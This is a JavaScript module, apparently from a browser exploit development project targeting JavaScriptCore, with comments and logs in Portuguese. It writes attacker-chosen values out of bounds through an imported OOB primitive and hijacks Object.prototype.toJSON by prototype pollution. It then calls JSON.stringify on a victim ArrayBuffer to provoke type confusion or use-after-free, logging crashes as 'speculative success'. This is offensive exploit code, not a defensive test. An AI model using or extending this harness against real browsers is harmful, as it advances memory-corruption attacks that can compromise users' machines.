// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';

let callCount_toJSON_tc = 0;
// Reduzido para logar apenas as primeríssimas chamadas ou se um erro ocorrer cedo
const MINIMAL_LOG_CALL_COUNT_THRESHOLD = 5; // Ou o valor que estava quando congelou

async function executeSingleJsonTCTest_MinimalLog( // Nome reflete a lógica do toJSON
    description,
    corruption_offset,
    value_to_write,
    enable_pp,
    attemptOOBWrite,
    skipOOBEnvironmentSetup, // Adicionado para consistência, embora o teste de congelamento precise do setup
    logFn = logS3
) {
    const FNAME_SINGLE_TEST = `executeSingleJsonTCTest_MinimalLog<${description}>`;
    logFn(`--- Iniciando Teste Especulativo: ${description} ---`, "test", FNAME_SINGLE_TEST);
    logFn(`   Offset Corrupção: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, PP: ${enable_pp}, Escrita OOB: ${attemptOOBWrite}, Setup OOB: ${!skipOOBEnvironmentSetup}`, "info", FNAME_SINGLE_TEST);
    logFn(`   toJSON usará lógica SIMPLES com logging MÍNIMO (primeiras ${MINIMAL_LOG_CALL_COUNT_THRESHOLD} chamadas).`, "info", FNAME_SINGLE_TEST);

    callCount_toJSON_tc = 0;

    if (!skipOOBEnvironmentSetup) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logFn("Falha ao configurar ambiente OOB. Abortando este teste.", "error", FNAME_SINGLE_TEST);
            return false;
        }
    } else {
        logFn("Setup do ambiente OOB pulado.", "info", FNAME_SINGLE_TEST);
        if (oob_array_buffer_real) clearOOBEnvironment(); // Limpa se foi pulado mas existia
    }

    let victim_ab = new ArrayBuffer(64); // Usaremos ArrayBuffer como vítima principal, pois era o contexto original
    logFn(`ArrayBuffer vítima (64 bytes) recriado.`, "info", FNAME_SINGLE_TEST);

    const ppKey = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let pollutionApplied = false;
    let testSucceededSpeculatively = false;

    try {
        if (enable_pp) {
            logFn(`Tentando poluir Object.prototype.${ppKey}...`, "info", FNAME_SINGLE_TEST);
            Object.defineProperty(Object.prototype, ppKey, {
                value: function() { // Lógica SIMPLES para toJSON, com logging MÍNIMO
                    callCount_toJSON_tc++;
                    const currentOperationThis = this;
                    const logPrefixToJSON = `toJSON_TC_MinLog(Call ${callCount_toJSON_tc}, Test: ${description})`;
                                     
                    if (callCount_toJSON_tc <= MINIMAL_LOG_CALL_COUNT_THRESHOLD) {
                        logFn(`[[[ ${logPrefixToJSON} INVOCADO ]]] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, 'vuln', FNAME_SINGLE_TEST);
                    }
                    
                    try {
                        if (callCount_toJSON_tc <= MINIMAL_LOG_CALL_COUNT_THRESHOLD && (currentOperationThis === null || currentOperationThis === undefined)) {
                            logFn(`    ${logPrefixToJSON} 'this' é NULL ou UNDEFINED! SUCESSO ESPECULATIVO!`, 'critical', FNAME_SINGLE_TEST);
                            testSucceededSpeculatively = true;
                            return { toJSON_this_is_null_or_undefined_tc_min: true, call_count_tc: callCount_toJSON_tc };
                        }
                        const keys = Object.keys(this);
                        if (callCount_toJSON_tc <= MINIMAL_LOG_CALL_COUNT_THRESHOLD) {
                           logFn(`[[[ ${logPrefixToJSON} Object.keys OK. #Keys: ${keys.length} ]]]`, 'info', FNAME_SINGLE_TEST);
                        }
                        return { toJSON_executed_tc_min: true, keys_tc_min: keys, call_count_tc_min: callCount_toJSON_tc };
                    } catch (e_keys) {
                        logFn(`[[[ ${logPrefixToJSON} ERRO em Object.keys(this) ou acesso a 'this': ${e_keys.message}. SUCESSO ESPECULATIVO! ]]]`, 'critical', FNAME_SINGLE_TEST);
                        testSucceededSpeculatively = true; 
                        return { toJSON_error_tc_min: true, message_tc_min: e_keys.message, call_count_tc_min: callCount_toJSON_tc };
                    }
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logFn(`Object.prototype.${ppKey} poluído com lógica SIMPLES (logging MÍNIMO).`, "good", FNAME_SINGLE_TEST);
        }

        if (attemptOOBWrite) {
            const bytes_to_write_for_corruption = 4;
            if (corruption_offset >= 0 && corruption_offset + bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
                logFn(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME_SINGLE_TEST);
                oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
            } else {
                 logFn(`AVISO: Offset de corrupção ${toHex(corruption_offset)} inválido. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
            }
        }
        await PAUSE_S3(SHORT_PAUSE_S3);

        logFn(`>>> PRESTES A CHAMAR JSON.stringify(victim_ab) para teste: ${description}`, "info", FNAME_SINGLE_TEST);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(victim_ab);
            logFn(`<<< RETORNO JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_SINGLE_TEST);
             if (stringifyResult && typeof stringifyResult === 'string') {
                if (stringifyResult.includes("toJSON_error_tc_min:true") || 
                    stringifyResult.includes("toJSON_this_is_null_or_undefined_tc_min:true")
                    ) {
                    logFn("SUCESSO ESPECULATIVO (TC): Erro/Corrupção detectado DENTRO do toJSON poluído (lógica mínima).", "vuln", FNAME_SINGLE_TEST);
                } else if (stringifyResult.includes("toJSON_executed_tc_min:true")) {
                    logFn("JSON.stringify executou toJSON poluído (lógica mínima) sem erro interno aparente. Verifique RangeError não capturado.", "good", FNAME_SINGLE_TEST);
                }
            }
        } catch (e) {
            logFn(`ERRO CRÍTICO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME_SINGLE_TEST);
            testSucceededSpeculatively = true;
        }

    } catch (mainIterationError) {
        logFn(`Erro principal na iteração do teste (${description}): ${mainIterationError.message}`, "error", FNAME_SINGLE_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKey];
            }
        }
        // Sempre limpar o ambiente OOB se ele foi configurado
        if (!skipOOBEnvironmentSetup && oob_array_buffer_real) {
            clearOOBEnvironment();
        }
    }
    logFn(`--- Teste Especulativo Concluído: ${description} (Sucesso Especulativo: ${testSucceededSpeculatively}, Chamadas toJSON: ${callCount_toJSON_tc}) ---`, "test", FNAME_SINGLE_TEST);
    return testSucceededSpeculatively;
}

// Função exportada para rodar um teste específico
export async function runSpecificJsonTCTest_MinimalLogging(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, skipOOBEnvSetup = false) {
    return await executeSingleJsonTCTest_MinimalLog(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, skipOOBEnvSetup, logS3);
}
